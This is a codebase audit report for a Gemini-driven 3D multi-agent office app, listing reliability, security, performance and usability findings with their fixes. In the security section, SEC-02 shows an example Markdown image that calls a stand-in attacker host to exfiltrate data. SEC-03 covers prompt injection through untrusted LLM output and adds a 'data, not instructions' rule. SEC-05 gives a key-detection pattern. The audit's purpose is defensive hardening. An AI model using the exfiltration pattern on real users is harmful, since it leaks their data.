# The Delegation: Codebase Audit

Baseline: commit `d938648` on `refactor/nextjs-shadcn-hono`. Seven audit passes (security, architecture, performance, usability, reliability, comprehensibility, migration) produced 137 raw findings. After deduplication, 95 items remain. One finding was downgraded after we checked it against the code: the Vite `define` for `GEMINI_API_KEY` inlines nothing, because no source file reads `process.env.GEMINI_API_KEY` (see SEC-05). File paths and line numbers refer to `d938648`.

## Executive summary: top 5 risks

1. **Unbounded API spend on the user's key (REL-01, REL-02).** The agent loop retries failed or unfinished work forever with no backoff or cap. `SceneManager.dispose()` also leaks the `AgentSimulation`. Under Next.js StrictMode, the dev double-mount will therefore run two agent loops against the same Gemini key.
2. **Scene crash on Next.js (MIG-01, MIG-02).** `import.meta.env.BASE_URL` is evaluated at module scope and will throw under webpack/Turbopack. The app also imports `three/webgpu` and reads `localStorage` at import time, so it must sit behind an `ssr:false` client boundary.
3. **Key exposure (SEC-01, SEC-02).** The Gemini key sits in plaintext `localStorage` on the shared `arturitu.github.io` origin, so any other Pages site under that account can read it. LLM-generated Markdown can also load remote images (an exfiltration channel) and open links in the same tab, which navigates away from a session that is not saved.
4. **Orchestration state corruption (REL-03 to REL-08).** In-flight LLM calls cannot be cancelled. Agent history has several writers and loses updates. Agents get stuck in `on_hold`, and projects get stuck in `working`. Tool arguments are never validated. In practice, projects stall and user chat messages disappear.
5. **Architecture blocks the Hono backend (ARCH-01, ARCH-02, ARCH-07).** The agent logic calls Zustand singletons and UI actions directly, and the WebGPU `SceneManager` owns orchestration. There is no LLM-gateway seam, so LLM calls and key custody cannot move server-side without first adding ports.

## Scorecard

| Dimension | Rating (1-5) | Justification |
|---|---|---|
| Performance | 2 | Near-per-frame GPU readback, a 1.76 MB eager main chunk, and a debug log that re-stringifies raw SDK responses on every store write. |
| Reliability | 1 | Infinite retry loop, leaked simulations, no cancellation, stuck agent/project states, and silent loss of chat messages and project data on reload. |
| Security | 2 | BYOK key in shared-origin localStorage, no CSP, unvalidated LLM tool calls, untrusted output injected into prompts. No secrets ship in the bundle. |
| Comprehensibility | 2 | Large amounts of dead state and code, `any` types that hide real bugs (CODE-01), hard-coded agent indices, and no ESLint or formatter. |
| Usability | 2 | Modals lack dialog semantics, dismissing a dialog can destroy data, there is no key onboarding, the layout breaks below about 900px, and agents can only be selected with a mouse. |
| Scalability | 1 | Browser-only, single project, prompts and history grow without bound, agent identity is positional, and nothing persists. |
| Modularity | 2 | Domain logic is welded to stores and the 3D scene. Cross-store side effects run at import time, and there are no test seams. |

Owners: `core` (src/core, stores), `simulation` (3D), `panels` (main UI), `modals`, `configurator` (team editor), `infra` (build/CI), `backend` (Hono/shared). Effort: S < 0.5 day, M 1-3 days, L > 3 days.


## Changes in this refactor

Status column: **Fixed** means the recommendation is in the code and was checked against it; **Partially fixed** means the main risk is addressed and the remainder is listed below. Paths in the tables still refer to `d938648`; the code now lives under `apps/web/src/`. Nothing below has been exercised in a browser yet: typecheck, lint and the static build pass, and the exported asset URLs were inspected.

**Tooling and layout**
- Turborepo monorepo on Bun workspaces (`bun@1.3.11`): `apps/web` (Next.js 16 App Router, `output: 'export'`, basePath `/the-delegation`, `trailingSlash`, unoptimized images), `apps/api` (Hono), `packages/shared` (zod contract). Root `typecheck`, `lint` and `build` run through turbo; CI installs with `bun install --frozen-lockfile`, audits, typechecks, lints, builds, greps `out/` for API keys and deploys `apps/web/out`.
- Vite, `import.meta.env` and the AI Studio leftovers are gone. Assets resolve through `src/lib/asset.ts`; the app sits behind a `next/dynamic(..., { ssr: false })` boundary; storage access is SSR-safe (`src/lib/storage.ts`).
- A postbuild script injects a hashed Content-Security-Policy meta tag into every exported page. Biome lints and formats every package (`noExplicitAny`, `noConsole`, unused variables and imports as errors; `next` and `react` domains in `apps/web`): 0 errors and 0 warnings. Every package, `apps/web` included, is `strict: true`, and `@types/three` types the scene's TSL code.
- React strict mode is back on as the regression test for REL-02. `next dev` binds to localhost (`dev:lan` opts in to the network).

**UI (shadcn/ui, Tailwind v4 tokens)**
- Every modal is a Radix `Dialog`/`AlertDialog`; one `ConfirmDialog` serves reset, task delete, discard-run, team switch/delete/reset, agent removal and discard-unsaved-changes. The design-mode editor is a full-screen dialog, so portals stack correctly.
- Brand colors are shadcn tokens (`--primary`, `--user`, `--success`, `--ring`); the `darkDelegation` alias is removed. Text floor is 11px.
- Panels split into focused components (log, chat, inspector, Kanban dock). Shared helpers: `src/components/Markdown.tsx` (no raw HTML, no remote images, http(s)/mailto links only; used by every Markdown render site), `src/components/ExternalLink.tsx`, `src/lib/clipboard.ts`, `src/lib/format.ts`.
- Keyboard access: team roster, inspector back button, labelled alert bubbles, Kanban agent tags, Logs/Tasks toggles, drawers below `lg`, keyboard-resizable Kanban dock.
- The final-output review closes non-destructively ("Review later"); a "Review deliverable" button in the project panel and a persistent toast reopen it, and approval goes straight to the store. The final deliverable shows when it was approved (`finalizedAt`).
- First-run key onboarding: an onboarding variant of the key dialog, an "Add API key" alert in the project panel, and the key dialog opens only for auth/missing-key errors (everything else is a toast). Failed chat replies render as errors; a task's last failure shows on its Kanban card.
- The canvas shows a loading state and an explanatory error when WebGPU/WebGL2 or the model download fails.

**Agents and orchestration**
- Ports (`src/core/orchestration/ports.ts`) with a Zustand adapter; `AgentBrain` takes deps by constructor, keeps no history copy, aborts on reset/dispose/task removal and has a 60 s timeout per call.
- One retry policy, in `AgentBrain`: exponential backoff, 4 unproductive attempts per intent, 150 calls and 30 tasks per project, immediate pause on quota/auth errors, and a "Resume" toast. The duplicate 3-attempt budget in `AgentSimulation` (which stopped silently before the brain's pause could fire) was removed.
- Tools validate their arguments and are authorized per agent and phase; prompts keep a static system part and pass the board as tagged, truncated data. History is append-only and capped; the user's chat message is recorded only when the agent can actually answer it (`AgentHost.canChat` uses the same `canChatWith` rule as the UI).
- `AgentHost.dispose()` now disposes its brain (it used to leak the store subscription and in-flight call), and a disposed brain never starts another call. `isAwaitingOutputReview` also counts a deliverable closed with "Review later", so the lead cannot deliver twice.
- Dead state removed: `boardroomHistories`, `agentSummaries`, `isLogOpen`/`isKanbanOpen` (`setLogOpen` is now `setLogFilter`), `setPhase`, `setFinalOutput`, `uiStore.chatMessages`/`instanceCount` and their cross-store subscription, `ChatMessage`, the wide `AgentState` type (now `AgentWorkStatus`), `SceneManager.getLeadBrain`, the deprecated team-store wrappers (`saveCustomSystem`, `updateSystem`, `updateActiveSystem`, `AgentSet`).

**3D scene** (visuals unchanged)
- `SceneManager.dispose()` tears down the simulation, input, controls, GPU resources, render loop and canvas once. Models load in parallel through one shared Draco loader (wasm only; the 700 KB asm.js decoder is deleted). Walking speed no longer depends on refresh rate; per-frame allocations are gone; team switches rebuild once and dispose old GPU resources; the renderer is resized once a Kanban drag ends.

**Backend (prepared, not used by the UI)**
- `apps/api`: runtime-agnostic Hono app (`/api/health`, `POST /api/llm/completions`) with request ids, secure headers, allowlist CORS, body-size limit, zod validation against `@the-delegation/shared`, a dev-only in-memory rate limiter and normalized upstream errors. `apps/web/src/lib/api-client.ts` is a typed `hc<AppType>` client; `.env.example` files document `GEMINI_API_KEY`, `ALLOWED_ORIGINS` and `NEXT_PUBLIC_API_URL`.

### Still open

Everything still open is a GitHub issue: [volken-dev/3d-office issues](https://github.com/volken-dev/3d-office/issues). REL-07/REL-10 #1, SEC-01 #2, PERF-02 #3, PERF-03 #4, PERF-04 #5, UX-04 #6, UX-06 #7, UX-13 #8, UX-14 #9, UX-17 #10, ARCH-01/02 #11, ARCH-03 and CODE-04 #12, ARCH-04 #13, ARCH-05/06 #14, ARCH-07 #15, ARCH-08 #16, ARCH-09 #17, MIG-07 #18, setup-bun pin #19. Bugs found during the rule-enforcement pass are #21 to #24.

---

## Reliability (REL)

| ID | Severity | Title | Files | Recommendation | Effort | Owner | Status |
|---|---|---|---|---|---|---|---|
| REL-01 | Critical | Agent loop retries failed/unfinished work forever; no backoff, cap or spend budget | src/simulation/core/AgentSimulation.ts:29-36,99-128; src/core/agent/AgentBrain.ts:145-153; src/core/agent/tools/proposeTask.ts | Per-task attempt counter with exponential backoff, `failed` status after 3 attempts, per-project call/task budget, pause on auth/quota errors | M | core | Fixed |
| REL-02 | Critical | `SceneManager.dispose` leaks AgentSimulation, InputManager, OrbitControls, canvas; StrictMode double-mount runs two agent loops | src/simulation/SceneManager.ts:70-75,130,398; src/simulation/core/Engine.ts:36,77-79; src/App.tsx:63-77 | Dispose simulation, InputManager, controls; `setAnimationLoop(null)`; remove canvas; verify under StrictMode | S | simulation | Fixed |
| REL-03 | High | No cancellation, timeout or run identity for LLM calls; disposed simulation keeps acting after reset/team switch | src/simulation/core/AgentSimulation.ts:106,166-171; src/simulation/core/AgentHost.ts:67-69; src/core/agent/AgentBrain.ts:71-76,137-153; src/core/llm/providers/GeminiProvider.ts:8-35 | AbortController per think with `abortSignal` + 60s timeout; `disposed` guard; runId/epoch check before applying tool calls | M | core | Fixed |
| REL-04 | High | "Start New Project" leaves the old conversation in AgentBrain and writes it back to the store | src/core/agent/AgentBrain.ts:46-53,195-198; src/integration/store/coreStore.ts:171-188 | `refreshFromStore` must replace with `?? []`; add `AgentSimulation.reset()` that aborts thinks and idles all hosts | S | core | Fixed |
| REL-05 | High | Agent history has multiple writers (lost updates across await); chat messages silently dropped while agent is busy | src/core/agent/AgentBrain.ts:33-38,128-134,195-202; src/simulation/SceneManager.ts:229-243; src/integration/store/coreStore.ts:281-314 | Append-only `appendMessages` owned by the store; per-agent promise queue for chat; typed `busy` result shown to user | M | core | Fixed |
| REL-06 | High | AgentHost stays `on_hold` after approve/reject/delete; agent status has two sources of truth | src/core/agent/tools/completeTask.ts:10-25; src/integration/store/coreStore.ts:209-226,259-316; src/simulation/core/AgentHost.ts:9,21-23; src/integration/hooks/useChatAvailability.ts:31 | One lifecycle owner: simulation reacts to task transitions; remove side effects inside `set()`; single `canChat` helper | M | core | Fixed |
| REL-07 | High | Project stuck in `working` when lead's conclude turn does not call `deliver_project` | src/simulation/core/AgentSimulation.ts:29-36,130-140; src/core/agent/AgentBrain.ts:150-169 | Heartbeat calls `checkProjectCompletion` with retry/nudge (max 3), then a "Deliver manually" action; gate on tasks/phase changes | S | simulation | Partially fixed |
| REL-08 | High | LLM tool arguments unvalidated and unauthorized (any agent completes any task, assigns to non-existent agents) | src/core/agent/ToolRegistry.ts:26-47; src/core/agent/tools/{proposeTask,completeTask,deliverProject}.ts | zod schema + `isAllowed(agent, phase)` per tool; reject unoffered tools; return `{ok:false,error}` into history | M | core | Fixed |
| REL-09 | Medium | Every LLM error (429, network, model) opens the BYOK key modal; no per-agent/in-chat error state | src/core/agent/AgentBrain.ts:145-149; src/interface/BYOKModal.tsx:90-118 | Error classifier (auth/quota/transient); BYOK only for auth; Sonner toast + `Task.error` + Retry | S | core | Fixed |
| REL-10 | Medium | Final-output review gate split across tool and AgentBrain; marks project done before user approves | src/core/agent/tools/deliverProject.ts:23-30; src/core/agent/AgentBrain.ts:137-142,171-187 | `deliverProject` sets `pendingOutput` + `reviewing` phase or finalizes; delete name-check branch; add "Request changes" | S | core | Partially fixed |
| REL-11 | Medium | Deleting the last open task ends the project with no output | src/integration/store/coreStore.ts:209-226; src/interface/KanbanPanel.tsx:73-91 | Remove phase transition from `removeTask`; reset owner agent; confirm deleting in-progress tasks | S | core | Fixed |
| REL-12 | Medium | Unguarded `JSON.parse` of tool args can permanently poison an agent's history | src/core/llm/providers/GeminiProvider.ts:57,71,113,123 | Keep args as objects in `LLMToolCall`, or safeParse returning `{}` | S | core | Fixed |
| REL-13 | Medium | First UI-store change after load recreates the simulation and warps all characters to spawn | src/simulation/SceneManager.ts:42,144-156 | Initialize `lastAgentSetId` in constructor; dedicated teamStore subscription | S | simulation | Fixed |
| REL-14 | Medium | Fire-and-forget async calls in agent loop and scene init produce unhandled rejections | src/simulation/core/AgentSimulation.ts:29-140; src/simulation/SceneManager.ts:74 | `run(label, fn)` wrapper that catches and routes to error state; `init().catch(...)` | S | simulation | Fixed |
| REL-15 | Medium | WebGPU/asset failures swallowed; no loading or error state, unsupported browsers get a blank canvas | src/simulation/core/Engine.ts:40-46; src/simulation/SceneManager.ts:109-142; src/interface/SimulationView.tsx:78-81; src/App.tsx:126-128 | `sceneStatus` in uiStore; Skeleton while loading; destructive Alert with browser guidance on error | S | simulation | Fixed |
| REL-16 | Medium | Persisted `team-storage` and `byok-config` trusted without validation; one corrupt entry crashes at module load | src/integration/store/teamStore.ts:66-85; src/integration/store/uiStore.ts:10,34-43 | zod/type guard in `migrate` and rehydrate; fall back to default team/model | S | core | Fixed |
| REL-17 | Low | Untracked timers (scroll, copy feedback) not cleared on unmount | src/interface/ActionLogPanel.tsx:25,380-382; src/interface/ChatPanel.tsx:50-57; src/interface/FinalOutputModal.tsx:20 | Return `clearTimeout` from effects; keep ids in refs | S | panels | Fixed |

**REL-01: Unbounded retry and spend (Critical)**
- Evidence: `processScheduledTasks` picks `scheduled` **or** `in_progress` tasks for idle agents. `startTaskExecution` swallows errors, sets the agent to idle in `finally` and reschedules. `AgentBrain.think`'s `finally` also calls `processScheduledTasks`. When the call fails (bad key, 429, network) or the model replies without calling `complete_task`, the task is restarted 1-3 s later with no limit. The 5 s heartbeat re-sparks the lead forever whenever `phase==='working' && tasks.length===0`. Every failure reopens the BYOK modal.
- Fix: track `Map<taskId,{attempts,nextAt}>` with 2/4/8 s backoff and mark the task `failed` (with a Retry button in Kanban) after 3 attempts. Treat 401/403/429 as fatal and pause scheduling. Add `budget.ts` with `maxLlmCalls`/`maxTasks` per project, checked before each provider call. When budgets run out, move to a `paused` phase.

**REL-02: Leaked simulation on dispose (Critical)**
- Evidence: `dispose()` at SceneManager.ts:398 never calls `this.simulation.dispose()`, so the 5 s `setInterval` and the store subscriptions survive. The `InputManager` created at :130 is never stored. `Engine` appends the canvas but never removes it, and never calls `setAnimationLoop(null)`. App Router enables `reactStrictMode` by default, so dev mount → unmount → mount leaves two orchestrators that can both spark the lead.
- Fix: in `SceneManager.dispose()`, call `simulation?.dispose()`, `inputManager.dispose()` and `stage.controls.dispose()`. In `Engine.dispose()`, call `setAnimationLoop(null)` and `renderer.domElement.remove()`. Keep `reactStrictMode: true` as the regression test. Only if the migration must land first, disable it temporarily with a TODO pointing to this item.

**REL-03: No cancellation or run identity (High)**
- Evidence: `reinitializeSimulation()` disposes the simulation, but `AgentHost.dispose()` is a no-op and pending `generateCompletion` calls are never aborted. When they resolve, `ToolRegistry.process` and `syncToStore` write into the freshly reset store, and `finally` calls `processScheduledTasks()` on the disposed simulation, which has no guard. Agent indices overlap between teams, so the old team's hosts execute the new project's tasks. Gemini calls have no timeout either, so a hung call leaves the agent "thinking" forever.
- Fix: create one AbortController per `think`, combined as `AbortSignal.any([signal, AbortSignal.timeout(60_000)])` and passed as `config.abortSignal`. Abort on reset, team switch and dispose. Add a `disposed` flag that every entry point checks. Stamp each run with a `runId` and drop results from stale runs.

**REL-04: Reset keeps the old conversation (High)**
- Evidence: `refreshFromStore()` is `if (history) this.history = [...history]`. After `resetProject()` sets `agentHistories: {}`, the brain keeps its old in-memory history and writes it back on the next `syncToStore()`. Reset also leaves `AgentHost.state` and `currentTaskId` untouched.
- Fix: `this.history = [...(agentHistories[idx] ?? [])]`. Add `AgentSimulation.reset()` (abort, idle all hosts, clear the spark timer) and call it from every reset path.

**REL-05: Lost history updates and dropped chat (High)**
- Evidence: `think()` snapshots history, awaits the LLM, then `setAgentHistory` replaces the whole array. Meanwhile `SceneManager.sendMessage` (:232) and `rejectTask` append directly, and those appends are lost. `sendMessage` writes the user message before `canChat()` runs. If the agent is busy, `think()` returns `''`: no reply and no error. The orphaned message is later replayed as context.
- Fix: make the store the only owner of history, with `appendMessages` and no mutable copy in AgentBrain. Route chat through the orchestrator with a per-agent promise queue, or return `{status:'busy'}` and show it to the user.

**REL-06: Stuck `on_hold` and two status sources (High)**
- Evidence: `completeTask` sets `AgentHost` to `on_hold`. `approveTask`/`rejectTask` only update `uiStore.agentStatuses`, and they do it from inside a zustand `set()` updater. `AgentHost.canChat()` checks the host state while `useChatAvailability` checks the UI status, so the two disagree.
- Fix: move agent status into domain state as the single source of truth, derive `on_hold` from tasks, and have the orchestrator react to task transitions. Use one shared `canChat()`.

**REL-07: Project stuck in `working` (High)**
- Evidence: `checkProjectCompletion` runs only from the store subscriber and from `startTaskExecution`'s `finally`. A text-only conclude reply never retries. The next unrelated store write, such as a chat message, fires `concludeProject` and races the user's chat.
- Fix: run completion from the heartbeat with `concludeAttempts`. After a reply that does not deliver, nudge with "You must call deliver_project now", up to 3 times, then offer "Deliver manually". Gate the subscriber on `tasks`/`phase` changes.

**REL-08: Unvalidated tool calls (High)**
- Evidence: `proposeTask` accepts `agentId > 0 ? agentId : self` with no existence or type check. Tasks assigned to missing agents stay `scheduled` forever and block completion. `completeTask` never checks that the task exists, belongs to the caller or is `in_progress`. `ToolRegistry.process(this.host as any, ...)` erases the types. Any agent can call `deliver_project`.
- Fix: define each tool once as `{definition, argsSchema (zod), isAllowed, handler}`. Reject tools that were not offered to that agent in that phase. Return errors into history so the model can correct itself. Reuse the same schemas in `shared/` for Hono.

---

## Security (SEC)

| ID | Severity | Title | Files | Recommendation | Effort | Owner | Status |
|---|---|---|---|---|---|---|---|
| SEC-01 | High | Gemini key in plaintext localStorage on the shared `arturitu.github.io` origin; modal copy claims the key "never leaves your browser" | src/interface/BYOKModal.tsx:11,27,85-87; src/integration/store/uiStore.ts:34-43 | Memory-only by default with an opt-in "Remember on this device"; single `keyStorage` module; accurate copy and key-restriction guidance; long term: dedicated origin or server-side custody | M | core | Partially fixed |
| SEC-02 | High | LLM Markdown auto-loads remote images (exfiltration) and opens same-tab links that destroy the session | src/interface/{ChatPanel.tsx:136-139,FinalOutputModal.tsx:55-58,AuditModal.tsx:130-135,ProjectView.tsx:95-98} | One shared `Markdown` component: images as placeholders, links `target=_blank rel="noopener noreferrer nofollow"`, `urlTransform` allowlist, `skipHtml` | S | panels | Fixed |
| SEC-03 | Medium | Untrusted LLM output and user feedback are injected verbatim into every agent's system prompt | src/core/agent/PromptBuilder.ts:20-43; src/integration/store/coreStore.ts:288-295 | Keep system prompt static; move board/outputs to a tagged, escaped context message marked "data, not instructions"; truncate | M | core | Fixed |
| SEC-04 | Medium | No Content-Security-Policy or referrer policy on the static deploy | index.html; src/index.css:2 | Meta CSP in `src/app/layout.tsx` (`connect-src` Gemini only, `img-src 'self' data: blob:`, `wasm-unsafe-eval` for Draco, script hashes via postbuild); `strict-origin-when-cross-origin` | M | infra | Fixed |
| SEC-05 | Low | Dead `define` of `GEMINI_API_KEY` in vite.config (nothing reads it today, but it is a latent leak path) | vite.config.ts:11-13 | Do not port to next.config; never use `NEXT_PUBLIC_` for secrets; CI grep for `AIza[0-9A-Za-z_-]{35}` in `out/`; add `.env.example` | S | infra | Fixed |
| SEC-06 | Low | Inconsistent external-link `rel` attributes | src/interface/{Header.tsx:51-61,BYOKModal.tsx:74-76,PricingModal.tsx:39-41,InfoModal.tsx:51-64} | Shared `ExternalLink` component (also used by the Markdown `a` override) | S | panels | Fixed |
| SEC-07 | Low | Dev server binds to all interfaces | package.json:13 | `next dev -p 3000` (localhost); opt-in `dev:lan` script | S | infra | Fixed |

**SEC-01: Key storage on a shared origin (High)**
- Evidence: `localStorage.setItem('byok-config', JSON.stringify({apiKey, model}))`. localStorage is scoped per origin, not per path, so every Pages site under `arturitu.github.io/*` (and every fork's `<user>.github.io`) can read the key. It is kept indefinitely, cannot be opted out of, and is parsed back without validation. The modal copy "never leaves your browser" is false: the key goes to Google's API.
- Fix: keep the key in memory only unless the user opts in. Put all storage access in one validated `keyStorage`/persist slice, merged with ARCH-06. Change the copy to "Stored in this browser and sent directly to Google's Gemini API", with a link to referrer/API key restriction. Next phase: move custody to Hono (see Roadmap).

**SEC-02: Markdown exfiltration (High)**
- Evidence: four `<ReactMarkdown remarkPlugins={[remarkGfm]}>` call sites have no `components` or `urlTransform`. react-markdown v10 blocks raw HTML and `javascript:` URLs, but `![x](https://attacker/?q=...)` loads automatically, and links open in the same tab, which wipes the unpersisted project.
- Fix: a shared, lazily loaded `Markdown` component (this also serves PERF-03 and PERF-07). Render images as `[image: alt]` placeholders, send links through `ExternalLink`, allow only http(s) and mailto, and back this up with `img-src` in the CSP.

---

## Performance (PERF)

| ID | Severity | Title | Files | Recommendation | Effort | Owner | Status |
|---|---|---|---|---|---|---|---|
| PERF-01 | High | Technical log (the default tab) JSON-stringifies every raw SDK response for 30 entries on every store write | src/interface/ActionLogPanel.tsx:39-69,328-382,543-545; src/integration/store/coreStore.ts:333-391 | `React.memo` entries; lazy stringify on copy/expand; trim `raw` to `{modelVersion, finishReason, usage}`; default tab `activity` | M | panels | Fixed |
| PERF-02 | High | GPU→CPU readback runs back-to-back (~frame rate) with a new Float32Array each time; walk speed depends on refresh rate | src/simulation/SceneManager.ts:344-355; src/simulation/entities/CharacterManager.ts:59,171-182,319-330 | Move GOTO integration to CPU (≤6 instances) and drop readback; or add `uDelta`, throttle readback to ~15 Hz, reuse buffer | M | simulation | Partially fixed |
| PERF-03 | High | 1.76 MB (474 kB gzip) main chunk: `@google/genai`, react-markdown/remark-gfm and three/webgpu all eager; new GoogleGenAI per call | src/core/llm/providers/GeminiProvider.ts:1; src/core/agent/AgentBrain.ts:42; src/App.tsx:8-16; markdown call sites | Dynamic-import the SDK and cache one client per key; lazy Markdown; `next/dynamic` for modals and the scene; CI size budget | M | infra | Partially fixed |
| PERF-04 | Medium | `backdrop-blur` layers over a canvas that redraws every frame; scene keeps rendering behind full-screen modals | src/interface/UIOverlay.tsx:38,87,205; modal overlays; src/simulation/SceneManager.ts:339 | Solid bubble backgrounds; opaque Dialog overlay; pause render while a modal is open | S | panels | Partially fixed |
| PERF-05 | Medium | Every coreStore write fans out to simulation subscribers and a no-op localStorage persist | src/integration/store/coreStore.ts:94-100,441-445; src/simulation/SceneManager.ts:78-106; src/simulation/core/AgentSimulation.ts:27-82 | `subscribeWithSelector` on tasks/phase; drop persist (ARCH-06); run heartbeat only while `working` | S | core | Fixed |
| PERF-06 | Medium | Prompt embeds every done task's full output for every agent; histories and actionLog grow without bound (token cost + memory) | src/core/agent/PromptBuilder.ts:20-35; src/core/agent/AgentBrain.ts:56; src/integration/store/coreStore.ts:325-331,393-405 | Full outputs only for lead/dependents, others capped summaries; stable prefix first; cap history (~50/agent) and actionLog (~200) | M | core | Fixed |
| PERF-07 | Medium | ChatPanel re-parses all Markdown on each keystroke; typing notifies every uiStore subscriber | src/interface/ChatPanel.tsx:23-33,106-181,209-221; src/integration/store/uiStore.ts:46 | Split `ChatMessageList` (memo) / `ChatInput`; module-level remark plugins; no-op setters when unchanged | S | panels | Fixed |
| PERF-08 | Medium | Team editor writes to the store, re-persists and re-runs fitView on every keystroke | src/interface/VisualConfigurator/AgentConfigPanel.tsx:39-43; VisualConfigurator.tsx:80-104,138-142; src/integration/store/teamStore.ts:42-50,66-68 | Local draft, commit on Save; patch the single React Flow node; fitView deps `[viewMode, selectedTeamId]` | S | configurator | Fixed |
| PERF-09 | Medium | Pointer move raycasts the whole office scene recursively and forces layout | src/simulation/input/InputManager.ts:51-119,231-261 | Raycast navmesh only (or floor plane); rAF-coalesce pointermove; cache canvas rect | S | simulation | Fixed |
| PERF-10 | Medium | Team switch rebuilds character instances twice, recompiles shaders and leaks GPU geometry/material | src/simulation/SceneManager.ts:144-156; src/simulation/CharacterController.ts:304-326; src/simulation/entities/CharacterManager.ts:157-203,355-364 | Single rebuild path; dispose geometry/material; update colors in place when count is unchanged | M | simulation | Fixed |
| PERF-11 | Medium | Kanban resize re-renders the whole App on every mousemove and leaves the renderer at a stale size | src/App.tsx:29,42-61,97-114; src/simulation/SceneManager.ts:327-333 | `KanbanResizer` with pointer capture and ref-driven height (or shadcn Resizable); `onResize()` on drag end | S | panels | Fixed |
| PERF-12 | Medium | Sequential GLB loading, two DRACO decoder pools never disposed, unused 928 KB encoder shipped | src/simulation/SceneManager.ts:109-115; src/simulation/world/WorldManager.ts:21-25; src/simulation/entities/CharacterManager.ts:69-75; public/vendor/draco/ | Shared `loaders.ts` (one DRACOLoader, wasm); `Promise.all` loads; dispose after init; delete encoder | S | simulation | Fixed |
| PERF-13 | Low | Agent lists rebuilt on every render across components; Kanban tags read non-reactive state | src/data/agents.ts:263-285; UIOverlay, InspectorPanel, ChatPanel, AgentStatusPanel, KanbanPanel | WeakMap-memoized roster + `useTeamRoster()`; `AgentTag` component; memo `TaskCard` | S | core | Fixed |
| PERF-14 | Low | Per-frame Vector3 allocations in the render loop | src/simulation/SceneManager.ts:357-369; CharacterManager.ts:563-567; core/Stage.ts:71-81; CharacterController.ts:224-234 | `getCPUPosition(i, out)`; reusable temp vectors; cache player index | S | simulation | Fixed |

**PERF-01: Debug log re-serialization (High)**
- Evidence: `activeTab` defaults to `'technical'` (ActionLogPanel.tsx:332). Every un-memoized `DebugEntryView` builds `JSON.stringify(entry.contents/raw, null, 2)` on each render, even when collapsed. `raw` is the whole `GenerateContentResponse`. Each LLM call makes two store writes, which means about 60 large stringifies on the main thread alongside the WebGPU loop.
- Fix: memoize entries keyed by id, pass agent data in as props, build copy text lazily (`getText`), mount the `<pre>` only while expanded, trim `raw` at write time, and default to `activity`.

**PERF-02: GPU readback and frame-rate-dependent speed (High)**
- Evidence: an in-flight guard exists, but `syncFromGPU` starts again as soon as the previous one resolves. Each one creates a staging buffer, does a `mapAsync` and makes two copies (`new Float32Array(buffer)` then `.set`). The compute shader moves agents by `uSpeed.mul(3.0)` per dispatch with no delta (CharacterManager.ts:324), so on a 120 Hz display agents walk twice as fast as on a 60 Hz one.
- Fix: integrate on the CPU (`pos += dir * SPEED * delta`) and delete the compute/readback path. Otherwise, add a `uDelta` uniform and throttle readback to about 15 Hz into a reused buffer.

**PERF-03: Eager 1.76 MB bundle (High)**
- Evidence: `vite build` emits a 1,760 kB main chunk. `@google/genai` (825 kB unminified) is pulled in statically through `SceneManager → AgentSimulation → AgentHost → AgentBrain → GeminiProvider`, although no call can happen before a key is entered. Markdown is imported statically by four components. `new GoogleGenAI` runs on every `think`.
- Fix: `await import('@google/genai')` inside the provider, with a cached client per key. Load Markdown, modals and the 3D canvas with `next/dynamic`. Add a first-load JS budget check in CI.

---

## Usability (UX)

| ID | Severity | Title | Files | Recommendation | Effort | Owner | Status |
|---|---|---|---|---|---|---|---|
| UX-01 | High | Eleven hand-rolled modal overlays: no dialog role, focus trap, Escape or focus restore; conflicting z-indexes (z-50 to z-[9999]); three copies of one confirm dialog | src/interface/{BYOK,Info,Pricing,Reset,DeleteTask,FinalOutput,OutputReview,Audit,TeamFlow}Modal.tsx; VisualConfigurator/SystemDebugOverlay.tsx; src/App.tsx:118-131 | shadcn `Dialog` for all modals, one `ConfirmDialog` on `AlertDialog`; controlled `open`; delete z-index literals and the body-overflow effect | L | modals | Fixed |
| UX-02 | High | Dismissing the final-output review (X, backdrop, footer) escalates to a destructive project reset | src/interface/OutputReviewModal.tsx:31-45,66-71,107-161 | X/Escape/outside = "Review later" (keep pending output); "Review deliverable" entry point in InspectorPanel; reset as a separate destructive AlertDialog | M | modals | Fixed |
| UX-03 | High | Switching/deleting a team and removing an agent (with its subtree) wipe data with no confirmation | src/interface/VisualConfigurator/TeamCard.tsx:76-80,289-294; AgentConfigPanel.tsx:314-321; src/integration/store/coreStore.ts:449-453 | AlertDialog when a project is active; name agent and subtree count on removal, or toast with Undo | S | configurator | Fixed |
| UX-04 | High | No first-run key onboarding: users learn about the key from a red "API Error" after sending a message | src/interface/Header.tsx:93-102; src/interface/BYOKModal.tsx:91-118; src/core/agent/AgentBrain.ts:41 | Onboarding variant of the BYOK dialog when no key; Alert + "Add API key" in ProjectView; disable chat with tooltip; guard `sendMessage` | M | modals | Partially fixed |
| UX-05 | High | Agents and pending approvals reachable only by mouse in the 3D canvas; inspector has no back control | src/simulation/SceneManager.ts:133; src/interface/UIOverlay.tsx:23-45; InspectorPanel.tsx:59-63; KanbanPanel.tsx:57-61 | Team roster list in ProjectView; Back button in inspector; AlertBubble as labelled `<button>`; toast "Review" on `on_hold`; wire Kanban agent tags | M | panels | Fixed |
| UX-06 | High | Fixed 640px of side panels with no collapse; layout breaks below ~900px; Kanban resize mouse-only | src/App.tsx:42-61,85-115; ActionLogPanel.tsx:398; InspectorPanel.tsx:60; VisualConfigurator panels | Header toggles (`aria-pressed`); shadcn `Resizable` with collapsible panels; `Sheet` for side panels below `lg` | L | panels | Partially fixed |
| UX-07 | Medium | Many icon-only buttons lack an accessible name | Header, BYOKModal, ChatPanel, ActionLogPanel, KanbanPanel, VisualConfigurator (15 sites) | `Button size="icon"` + `aria-label` + Tooltip; drop `title` | S | panels | Fixed |
| UX-08 | Medium | Custom tooltips are hover-only on non-focusable divs | src/interface/components/{InfoTooltip,InfoBubble,TeamOutputBadge}.tsx; native `title` in Header, SimulationView, KanbanPanel | shadcn `Tooltip` (Popover for long/touch help); delete InfoTooltip | S | panels | Fixed |
| UX-09 | Medium | Configurator controls: div/button toggles, native select, style-mutating inputs, unassociated labels, mouse-only color picker | src/interface/VisualConfigurator/{AgentConfigPanel,TeamCard,ColorPicker}.tsx | shadcn `Switch`/`Label htmlFor`/`Input`/`Textarea`/`Select`; Popover color picker with labelled trigger | M | configurator | Fixed |
| UX-10 | Medium | Widespread 7-10px uppercase text and zinc-200/300 on white fail contrast | InspectorPanel, AgentStatusPanel, KanbanPanel, ActionLogPanel, AuditModal, TeamCard, src/index.css:28-30 | `--muted-foreground` ≥ zinc-500; type floor (body `text-sm`, meta `text-xs`, eyebrow ≥11px) | M | panels | Fixed |
